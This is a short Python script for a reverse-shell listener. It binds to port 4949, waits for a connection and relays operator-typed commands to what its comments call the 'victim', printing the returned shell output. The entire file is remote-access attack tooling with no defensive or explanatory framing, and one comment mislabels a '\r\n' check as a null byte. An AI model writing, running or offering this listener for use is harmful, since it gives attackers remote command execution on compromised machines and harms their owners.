import socket
import threading

# Set the port
port = 4949

# Create a socket object
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Bind the socket to the port
server_socket.bind(("0.0.0.0", port))

# Listen for incoming connections
server_socket.listen(1)

print("Listener started. Waiting for connection...")

# Accept incoming connections
client_socket, address = server_socket.accept()
print("Connected by", address)


# Create a thread to handle the connection
def handle_connection(client_socket):
    while True:
        try:
            # Get the command from the user
            command = input("Command: ")

            # Send the command to the victim
            client_socket.sendall(command.encode() + b"\n")

            # Receive the output from the victim
            output = bytearray()
            while True:
                data = client_socket.recv(1024)
                if data == b'\r\n':  # Check for the null byte indicator
                    break
                output.extend(data)

            print("-shell->", output.decode())

        except Exception as e:
            print("Error:", e)


# Start the thread
threading.Thread(target=handle_connection, args=(client_socket,)).start()